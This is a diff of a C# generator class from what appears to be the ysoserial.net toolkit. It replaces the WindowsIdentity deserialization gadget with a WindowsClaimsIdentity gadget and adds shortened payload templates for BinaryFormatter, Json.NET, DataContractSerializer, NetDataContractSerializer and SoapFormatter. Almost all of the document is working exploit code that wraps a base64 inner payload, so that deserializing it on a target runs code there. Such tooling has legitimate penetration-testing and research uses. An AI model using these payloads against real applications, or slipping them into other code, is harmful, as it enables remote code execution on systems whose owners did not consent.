@@ -2,36 +2,21 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Runtime.Serialization;
-using System.Security.Principal;
 using System.Xml;
 using Newtonsoft.Json;
 using System.Runtime.Serialization.Formatters.Soap;
+using Microsoft.IdentityModel.Claims;
 
 namespace ysoserial.Generators
 {
-    class WindowsIdentityGenerator : GenericGenerator
+    class WindowsClaimsIdentityGenerator : GenericGenerator
     {
         public override string Description()
         {
-            return "WindowsIdentity gadget";
+            return "WindowsClaimsIdentity (Microsoft.IdentityModel.Claims namespace) gadget";
 
-            // Bridge from BinaryFormatter constructor/callback to BinaryFormatter
-            // Usefule for Json.Net since it invokes ISerializable callbacks during deserialization
-
-            // WindowsIdentity extends ClaimsIdentity
-            // https://referencesource.microsoft.com/#mscorlib/system/security/claims/ClaimsIdentity.cs,60342e51e4acc828,references
-
-            // System.Security.ClaimsIdentity.bootstrapContext is an SerializationInfo key (BootstrapContextKey)
-            // added during serialization with binary formatter serialized Claims
-
-            // protected ClaimsIdentity(SerializationInfo info, StreamingContext context)
-            // private void Deserialize
-            // using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(info.GetString(BootstrapContextKey))))
-            //     m_bootstrapContext = bf.Deserialize(ms, null, false);
-            //
-            // Changed by Soroush Dalili: 
+            // This is similar to WindowsIdentityGenerator but based on Microsoft.IdentityModel.Claims.WindowsClaimsIdentity
             // "actor" has the same effect as "bootstrapContext" but is shorter. 
-            // Therefore, all ".bootstrapContext" has been replaced with ".actor" it has been replaced in this plugin
         }
 
         public override List<string> SupportedFormatters()
@@ -41,18 +26,23 @@ namespace ysoserial.Generators
 
         public override string Name()
         {
-            return "WindowsIdentity";
+            return "WindowsClaimsIdentity";
         }
 
         public override string Credit()
         {
-            return "Levi Broderick, updated by Soroush Dalili";
+            return "Soroush Dalili";
         }
 
         [Serializable]
-        public class IdentityMarshal : ISerializable
+        public class WindowsClaimsIdentityMarshal : ISerializable
         {
-            public IdentityMarshal(string b64payload)
+            public WindowsClaimsIdentityMarshal()
+            {
+                B64Payload = "";
+            }
+
+            public WindowsClaimsIdentityMarshal(string b64payload)
             {
                 B64Payload = b64payload;
             }
@@ -61,8 +51,12 @@ namespace ysoserial.Generators
 
             public void GetObjectData(SerializationInfo info, StreamingContext context)
             {
-                info.SetType(typeof(WindowsIdentity));
-                info.AddValue("System.Security.ClaimsIdentity.actor", B64Payload);
+                info.SetType(typeof(WindowsClaimsIdentity));
+                info.AddValue("_actor", B64Payload);
+                info.AddValue("m_userToken", new IntPtr(0));
+                info.AddValue("_label", null);
+                info.AddValue("_nameClaimType", null);
+                info.AddValue("_roleClaimType", null);
             }
         }
 
@@ -74,15 +68,20 @@ namespace ysoserial.Generators
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
             {
-                var obj = new IdentityMarshal(b64encoded);
+                var obj = new WindowsClaimsIdentityMarshal(b64encoded);
                 return Serialize(obj, formatter, test);
             }
             else if (formatter.ToLower().Equals("json.net"))
             {
+                /*
                 string payload = @"{
-                    '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+                    '$type': 'Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35',
                     'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
                 }";
+                */
+
+                // Payload has been shortened - if there is any problem, consider commenting the following payload and re-enable the previous one
+                string payload = @"{'$type':'Microsoft.IdentityModel.Claims.WindowsClaimsIdentity,Microsoft.IdentityModel','System.Security.ClaimsIdentity.actor':'" + b64encoded + @"'}";
 
                 if (test)
                 {
@@ -101,12 +100,16 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("datacontractserializer"))
             {
-                string payload = $@"<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
-    <WindowsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"">
+                /*
+                string payload = $@"<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
+    <WindowsClaimsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/Microsoft.IdentityModel.Claims"">
       <System.Security.ClaimsIdentity.actor i:type=""x:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.actor>
-       </WindowsIdentity>
+       </WindowsClaimsIdentity>
 </root>
 ";
+*/
+                // Payload has been shortened - if there is any problem, consider commenting the following payload and re-enable the previous one
+                string payload = $@"<root type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity,Microsoft.IdentityModel""><WindowsClaimsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/Microsoft.IdentityModel.Claims""><System.Security.ClaimsIdentity.actor i:type=""x:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.actor></WindowsClaimsIdentity></root>";
 
                 if (test)
                 {
@@ -126,12 +129,22 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("netdatacontractserializer"))
             {
+                /*
                 string payload = $@"<root>
-<w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""System.Security.Principal.WindowsIdentity"" z:Assembly=""mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
-  <System.Security.ClaimsIdentity.actor z:Type=""System.String"" z:Assembly=""0"" >{b64encoded}</System.Security.ClaimsIdentity.actor>
+<w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity"" z:Assembly=""Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
+  <_actor z:Type=""System.String"" z:Assembly=""0"" >{b64encoded}</_actor>
+  <m_userToken z:Type=""System.IntPtr"" z:Assembly=""0"" xmlns="""">
+    <value z:Type=""System.Int64"" z:Assembly=""0"">0</value>
+  </m_userToken>
+  <_label i:nil=""true""/>
+  <_nameClaimType i:nil=""true""/>
+  <_roleClaimType i:nil=""true""/>
 </w>
 </root>
 ";
+*/
+                // Payload has been shortened - if there is any problem, consider commenting the following payload and re-enable the previous one
+                string payload = $@"<root><w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity"" z:Assembly=""Microsoft.IdentityModel"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/""><_actor z:Type=""System.String"" z:Assembly=""0"" >{b64encoded}</_actor><m_userToken z:Type=""System.IntPtr"" z:Assembly=""0""><value z:Type=""System.Int64"" z:Assembly=""0"">0</value></m_userToken><_label i:nil=""1""/><_nameClaimType i:nil=""1""/><_roleClaimType i:nil=""1""/></w></root>";
 
                 if (test)
                 {
@@ -151,14 +164,18 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("soapformatter"))
             {
+                /*
                 string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
 <SOAP-ENV:Body>
-    <a1:WindowsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Security.Principal/mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+    <a1:WindowsClaimsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/Microsoft.IdentityModel.Claims/Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
       <System.Security.ClaimsIdentity.actor xsi:type=""xsd:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.actor>
-    </a1:WindowsIdentity>
+    </a1:WindowsClaimsIdentity>
 </SOAP-ENV:Body>
 </SOAP-ENV:Envelope>
 ";
+*/
+                // Payload has been shortened - if there is any problem, consider commenting the following payload and re-enable the previous one
+                string payload = $@"<s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/""><s:Body><a:WindowsClaimsIdentity xmlns:a=""http://schemas.microsoft.com/clr/nsassem/Microsoft.IdentityModel.Claims/Microsoft.IdentityModel""><System.Security.ClaimsIdentity.actor>{b64encoded}</System.Security.ClaimsIdentity.actor></a:WindowsClaimsIdentity></s:Body></s:Envelope>";
 
                 if (test)
                 {
